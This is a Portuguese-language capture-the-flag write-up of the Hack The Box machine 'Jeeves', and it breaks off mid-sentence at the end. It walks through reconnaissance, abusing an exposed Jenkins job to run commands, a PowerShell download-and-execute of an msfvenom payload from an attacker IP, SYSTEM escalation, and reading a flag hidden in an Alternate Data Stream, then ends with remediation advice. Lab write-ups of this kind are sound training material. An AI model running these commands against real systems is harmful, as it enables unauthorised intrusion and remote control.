# Report — Máquina: `Jeeves` — `10.129.228.112`

- **Fonte:** Hack The Box (HTB)
    
- **Data:** 2025-12-18
    
- **Autor:** Enrico Moreno
    
- **Nível:** Medium
    
---

## Executive Summary

A máquina **Jeeves** foi comprometida explorando uma instância exposta do **Jenkins** rodando em um servidor **Jetty**. Através da funcionalidade de execução de comandos em _jobs_, foi possível obter execução remota no sistema, evoluir para uma sessão **meterpreter** e escalar privilégios até **NT AUTHORITY\SYSTEM**. A flag final estava oculta em um **Alternate Data Stream (ADS)**, exigindo enumeração adicional no sistema de arquivos Windows.

---

## Planning & Scoping

- **Alvo:** `10.129.228.112`
    
- **Sistema operacional:** Windows
    
- **Ferramentas utilizadas:** nmap, gobuster, Jenkins, PowerShell, msfvenom, Metasploit
    
- **Limitações:** sem brute force externo, sem pivoting
    

---

## Discovery / Recon

### Nmap — Varredura completa

```bash
sudo nmap -sS -T4 -p- -sV -Pn 10.129.228.112 -oN ~/Desktop/Nmap_Jeeves.txt
```

**Resultado relevante:**

```
80/tcp    open  http   Microsoft IIS httpd 10.0
445/tcp   open  smb    Microsoft Windows
50000/tcp open  http   Jetty 9.4.z-SNAPSHOT
```

O Nmap indicou o hostname **JEEVES**, sugerindo uso de _virtual host_.

---

## Enumeration & Analysis

### Virtual Host

Após adicionar o hostname ao `/etc/hosts`:

```text
10.129.228.112  jeeves.htb
```

O acesso direto à porta **50000** retornava _404_, indicando a necessidade de enumeração adicional.

### Gobuster — Enumeração de diretórios

```bash
gobuster dir -u http://jeeves.htb:50000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50
```

**Resultado relevante:**

```
/askjeeves  (302) -> /askjeeves/
```

O diretório `/askjeeves/` expôs o painel do **Jenkins**.

---

## Attack / Exploitation

### Execução de comandos via Jenkins

Foi criado um novo _job_ no Jenkins com a opção **Execute Windows batch command**.

Teste inicial:

```cmd
whoami
```

Resultado:

```
jeeves\kohsuke
```

Confirmada a execução remota de comandos.

---

## Post-Exploitation

### Upload e execução de payload

Para maior estabilidade, foi gerado um payload com **msfvenom** e transferido para o alvo:

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.15.174/shell.exe','C:\Users\Public\shell.exe')
C:\Users\Public\shell.exe
```

Isso resultou em uma sessão **meterpreter**.

### User Flag

```
C:\Users\kohsuke\Desktop\user.txt
```

---

## Privilege Escalation

### getSystem

A escalada foi realizada com sucesso utilizando:

```text
getsystem
```

Sessão elevada para **NT AUTHORITY\SYSTEM**.

---

## Further Enumeration

### KeePass

Durante a enumeração, foi identificado um banco **KeePass (CEH.kdbx)**. O hash foi extraído e crackeado com **hashcat**, revelando a senha:

```
moonshine1
```

A senha não foi necessária para progressão, pois o acesso **SYSTEM** já havia sido obtido.

---

## Impact & Root Access

### Alternate Data Stream (ADS)

A flag final estava oculta em um **Alternate Data Stream** no arquivo `hm.txt`:

```cmd
dir /R hm.txt
more < hm.txt:root.txt
```

---

## Flags Obtidas

### User Flag

```
C:\Users\kohsuke\Desktop\user.txt
```

### Root Flag

```
C:\Users\Administrator\Desktop\hm.txt:root.txt
```

---

## Remediation Recommendations

- Restringir acesso ao Jenkins (autenticação obrigatória)
    
- Não permitir execução arbitrária de comandos em _jobs_
    
- Monitorar uso de PowerShell e downloads externos
    
- Auditar uso de **Alternate Data Streams**
    

---

## Lessons Learned

- Jenkins exposto equivale a execução remota imediata
    
- Enumeração de diretórios é crucial mesmo após _404_
    
- ADS pode ser usado para ocultar dados sensíveis no Windows
    

---

## Summary

A máquina **Jeeves** demonstra um cenário clássico de comprometimento via Jenkins exposto, seguido de escalonamento trivial e técnicas menos óbvias de ocultação de dados. O laboratório reforça a importância de enumeração cuidadosa e conhecimento de particularidades do sis
